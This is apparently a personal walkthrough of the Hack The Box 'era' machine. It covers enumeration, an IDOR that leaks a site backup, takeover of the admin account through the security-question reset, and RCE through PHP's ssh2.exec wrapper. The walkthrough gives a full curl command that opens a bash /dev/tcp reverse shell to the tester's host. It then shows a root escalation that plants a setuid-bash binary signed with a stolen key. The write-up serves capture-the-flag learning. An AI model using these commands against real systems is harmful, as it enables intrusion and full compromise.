# era

```
Nmap scan report for 10.129.237.233
Host is up, received reset ttl 63 (0.080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## enum

there is a contact form which does nothing. there is nothing else on the page but some static shit. but contact form reveals support@era.htb

the team section reveals some possible names

subdomain fuzz reveals `file.era.htb`

```bash
ffuf -w ~/.local/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.era.htb" -u http://era.htb -ac
```

on there is a custom file management app, it runs php (webshell?), but we need creds

we see endpoints like /login.php, /reset.php, /upload.php, /manage.php. taking a guess at /register.php and it exists (you could fuzz for that too)

```bash
ffuf -w ~/.local/share/SecLists/Discovery/Web-Content/raft-large-words.txt -u 'http://file.era.htb/FUZZ.php'
```

the register endpoint does work, for some reason it didn't work for me at first but eventually after a while it did... odd

## foothold

if we upload a file and get the downlaod link, we see it is using numeric ids for the parameter. fuzz this..

```bash
ffuf <(seq 1 1000) -u 'http://file.era.htb/download.php?id=FUZZ&dl=true' -H "Cookie: PHPSESSID=$phpsession" -fs 7686
```

we find existing ids 150 and 54, which are `signing.zip` and `site-backup-30-08-24.zip`

signing gives us an x509 privkey and genkey file, which reveals the user yurivich@era.com

site backup gives us the site source code :)

it also has the sqlite database with some hashes, they are unix blowfish hashes, and two of them crack for users eric and yuri

yuri's account lets us into the ftp server, but keeping our attention on the web app for now, we notice that the "reset security questions" page accepts a username, even though we are already logged in.

from the database we have the admin's username, which is "admin" followed by a random string. trying this on the reset page reveals we can change the security answers of aribitrary users. you can see it in the source code:

```php
if ($_SERVER["REQUEST_METHOD"] === "POST") {                                                                         
    $username = trim($_POST['username'] ?? '');    
    $new_answer1 = trim($_POST['new_answer1'] ?? '');                                                                
    $new_answer2 = trim($_POST['new_answer2'] ?? '');
    $new_answer3 = trim($_POST['new_answer3'] ?? '');                                                                
                                                          
    if ($username === '' || $new_answer1 === '' || $new_answer2 === '' || $new_answer3 === '') {
        $error_message = "All fields are required.";
    } else {                                          
        $query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
        $stmt = $db->prepare($query);
        $stmt->bindValue(1, $new_answer1, SQLITE3_TEXT);  
        $stmt->bindValue(2, $new_answer2, SQLITE3_TEXT);                                                             
        $stmt->bindValue(3, $new_answer3, SQLITE3_TEXT);                                                             
        $stmt->bindValue(4, $username, SQLITE3_TEXT);
```

it takes the username directly from the request params and trusts it.

there _are_ answers to admin's security questions in the backup, but they are outdated.

once we log in to the admin's account via the alternate login flow that allows us to just supply the security questions, it isn't evident that we have any new functionality from the UI, but in the source code we also find this in `download.php`:

```php
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }
```

so if we supply `show=true` and are user id 1 (admin), we can supply a php wrapper in the `format` parameter and it will get `fopen()`ed. 

we can see what libraries are included in the php config from the ftp server, there is a dir named `php8.1_conf`. assuming this is the same config for the web server:

```php
drwxr-xr-x    2 0        0            4096 Jul 22  2025 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
```

the only one here that isn't default is ssh2. it includes some wrappers that we can use: https://www.php.net/manual/en/wrappers.ssh2.php

the interesting one is `ssh2.exec://`, and on the docs it says we can just supply a connection string directly. assuming yuri's box password is the same as the one for `file.era.htb` and ftp, we can try something like this to see if we can get rce

```bash
curl -G -d 'show=true' -d "format=ssh2.exec://yuri:$yuripassg@localhost:22/ping%20-c1%2010.10.14.91%20%23" -d 'id=150' -H "Cookie: PHPSESSID=$phpsession" 'http://file.era.htb/download.php' -v
```

we encode a comment at the end because the filepath gets appended.

an indication that the connection succeeded is an output of "Resource id #3" in the http response, and from this command i get a ping back:

```
13:41:32.328167 IP era.htb > 10.10.14.91: ICMP echo request, id 1, seq 1, length 64
13:41:32.328203 IP 10.10.14.91 > era.htb: ICMP echo reply, id 1, seq 1, length 64
```

reverse shell:

```bash
curl -G -d 'show=true' -d "format=ssh2.exec://yuri:$yuripass@localhost:22/bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.91/1337+0>%261'+%23" -d 'id=150' -H "Cookie: PHPSESSID=$phpsession" 'http://file.era.htb/download.php' -v
```

## privesc

on the box, we see another user eric, who is in group `devs`, and has access to a directory `AV` in `/opt`. it contains a dir `periodic-checks`, that's all we know

there is also a cron job as root running `/root/backup_passwd.sh`. wonder what that's about...

trying the password we found for eric, we can just log into his account with `su eric` and get teh user flag

### root

inside the `periodic-checks` dir, there is a log file indicating av scans, and a `monitor` executable which is writable by devs. nonetheless this gets executed what looks like every minute or so, because the log file gets updated about that often.

presumably this is a cron defined in `/var/spool/cron/crontabs` which we don't have access to, but moral of the story is we can write our own executable there and get it executed as root

ill keep it simple and just write a shell script that makes a setuid bash

```sh
#!/bin/sh

cp /bin/bash /tmp/hz
chmod +s /tmp/hz
```

this naive attempt fails, and we can see why in the status log:

```
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

so i guess what we really need to do is make our own elf, and sign it with the key we found earlier...

if we inspect the `monitor` binary, we see there is a `.text_sig` section

```bash
objdump -x monitor
```

```
...
 27 .text_sig     000001ca  0000000000000000  0000000000000000  00003040  2**3
                  CONTENTS, READONLY
...
```

so im gonna assume this is a signature over the .text section of the binary. we can pull it out and see what it is

```bash
objcopy --dump-section .text_sig=monitor.sig monitor-box
file monitor-box.sig
```

```
monitor-box.sig: DER Encoded PKCS#7 Signed Data
```

we can see more with `openssl asn1parse`

```bash
openssl asn1parse -inform DER -in monitor-box.sig
```

```
    0:d=0  hl=4 l= 454 cons: SEQUENCE          
    4:d=1  hl=2 l=   9 prim: OBJECT            :pkcs7-signedData
   15:d=1  hl=4 l= 439 cons: cont [ 0 ]        
   19:d=2  hl=4 l= 435 cons: SEQUENCE          
   23:d=3  hl=2 l=   1 prim: INTEGER           :01
   26:d=3  hl=2 l=  13 cons: SET               
   28:d=4  hl=2 l=  11 cons: SEQUENCE          
   30:d=5  hl=2 l=   9 prim: OBJECT            :sha256
   41:d=3  hl=2 l=  11 cons: SEQUENCE          
   43:d=4  hl=2 l=   9 prim: OBJECT            :pkcs7-data
   54:d=3  hl=4 l= 400 cons: SET               
   58:d=4  hl=4 l= 396 cons: SEQUENCE          
   62:d=5  hl=2 l=   1 prim: INTEGER           :01
   65:d=5  hl=2 l= 103 cons: SEQUENCE          
   67:d=6  hl=2 l=  79 cons: SEQUENCE          
   69:d=7  hl=2 l=  17 cons: SET               
   71:d=8  hl=2 l=  15 cons: SEQUENCE          
   73:d=9  hl=2 l=   3 prim: OBJECT            :organizationName
   78:d=9  hl=2 l=   8 prim: UTF8STRING        :Era Inc.
   88:d=7  hl=2 l=  25 cons: SET               
   90:d=8  hl=2 l=  23 cons: SEQUENCE          
   92:d=9  hl=2 l=   3 prim: OBJECT            :commonName
   97:d=9  hl=2 l=  16 prim: UTF8STRING        :ELF verification
  115:d=7  hl=2 l=  31 cons: SET               
  117:d=8  hl=2 l=  29 cons: SEQUENCE          
  119:d=9  hl=2 l=   9 prim: OBJECT            :emailAddress
  130:d=9  hl=2 l=  16 prim: IA5STRING         :yurivich@era.com
  148:d=6  hl=2 l=  20 prim: INTEGER           :6D634AA981E193A1E448C5205FF79B84E6B6F50B
  170:d=5  hl=2 l=  11 cons: SEQUENCE          
  172:d=6  hl=2 l=   9 prim: OBJECT            :sha256
  183:d=5  hl=2 l=  13 cons: SEQUENCE          
  185:d=6  hl=2 l=   9 prim: OBJECT            :rsaEncryption
  196:d=6  hl=2 l=   0 prim: NULL              
  198:d=5  hl=4 l= 256 prim: OCTET STRING      [HEX DUMP]:6A8D5090E77AA22431D3E629241AC7EEC906DCE87592C90733B85EA5C466DB04A35A2864885300F2775CFBE983AE833D2C367030985AB5D9AE28CFBF75DB8E402955C9BEF8D3058E6EE11EB435BB30A3056DB85074BC4E15FC440A57E3F62F4B5ECD0E6B222DC40391892C7DED05FE45A3E9C00F0610F8A653ABF72571AACBF2FF38238658D08DCFBA331C6D20928C01C77D4E49EA94670C9DE942779E0967143D8149209FC12400588004C7CEBFD398EC6D55B50333DB46F2AB74E6AA24E9DC76D2C9C4183B991BC0F4762B1C091D82317CAAB31E88DFC048712BB9AC8A0DBB6CD7CD6BDCAAC96C2AFEFAA17944EBDD7A6E6F2E91DA5E41E0E65DDEEC9347EE
```

so we know the hash algorithm is sha256, and it's signed with the same key we already looted.

let's first compile the binary we want to replace `monitor` on the box with

```c
#include <stdlib.h>

int main(int argc, char** argv) {
        system("cp /bin/bash /tmp/hz; chmod +s /tmp/hz");
}
```

then we need to pull out the .text and sign it:

```bash
objcopy --dump-section .text=monitor.text monitor
openssl cms -sign -md sha256 -signer key.pem -nocerts -noattr -outform DER -binary -in monitor.text -out monitor.text_sig
```

then jam it into a new binary with a `.text_sig` section and the correct flags:

```bash
objcopy --add-section .text_sig=monitor.text_sig --set-section-flags .text_sig=contents,readonly monitor monitor.signed
```

now just drop it on the box and copy it to `/opt/AV/periodic-checks`, and wait for it to be executed!!

```
eric@era:/tmp$ ./hz -p
hz-5.1# id
uid=1000(eric) gid=1000(eric) euid=0(root) egid=0(root) groups=0(root),1000(eric),1001(devs)
hz-5.1# sha256sum /root/root.txt 
11ce0ba4bdaceff1342ce1b3dd9d5b37de2e5eb1c4e4bf4d5c75fd72596cc189  /root/root.txt
```

## post root

in the root home directory, there are a couple scripts to clean up any tampering, which had caused problems for me. one of them resets admin's security questions on `file.era.htb`. it also makes deletes everything in the webserver's `files` dir, except for the signing archive and site backup.

there is another one that replaces the monitor binary with a clean one.

interestingly the script that systemd service we saw earlier references isn't actually here.

but we can see the actual script that "checks" our signature:

```bash
#!/bin/bash

# Paths
BINARY="/opt/AV/periodic-checks/monitor"
SECTION=".text_sig"
EXTRACTED_SECTION="text_sig_section.bin"
ORGANIZATION="Era Inc."
EMAIL="yurivich@era.com"

# Extract the .text_sig section
objcopy --dump-section "$SECTION"="$EXTRACTED_SECTION" "$BINARY"

# Parse the ASN.1 structure
OUTPUT=$(openssl asn1parse -inform DER -in "$EXTRACTED_SECTION" 2>/dev/null)

if [[ $? -ne 0 ]]; then
    echo "[ERROR] Executable not signed. Tampering attempt detected. Skipping."
    rm -f "$EXTRACTED_SECTION"
    exit 1
fi

# Check for the organization name
ORG_CHECK=$(echo "$OUTPUT" | grep -oP "(?<=UTF8STRING        :)$ORGANIZATION")

# Check for the email address
EMAIL_CHECK=$(echo "$OUTPUT" | grep -oP "(?<=IA5STRING         :)$EMAIL")

# Decision logic
if [[ "$ORG_CHECK" == "$ORGANIZATION" && "$EMAIL_CHECK" == "$EMAIL" ]]; then
    $BINARY
    echo "[SUCCESS] No threats detected."
    ALLOW=1
else
    echo "[FAILURE] Binary has been tampered with. Skipping."
    ALLOW=0
fi

# Cleanup
rm -f "$EXTRACTED_SECTION"

# Exit with appropriate status
exit $ALLOW
```

looks like it doesn't even verify the signature, but rather checks that the org and email match. meaning we didn't even need a valid signature because those fields are arbitrary

we can now also see the crontab that runs that script in `/var/spool/cron/crontabs/root`

```
*/1 * * * * bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
*/3 * * * * bash -c 'echo > /opt/AV/periodic-checks/status.log'
*/30 * * * * bash -c '/root/answers.sh'
*/10 * * * * /root/clean_monitor.sh
```

we can see the monitor binary is replaced every 10 minutes, the security answers reset every 30 minutes, and the script we abused ran every minute as we guessed. as well as cleaning the log file every 3 minutes.

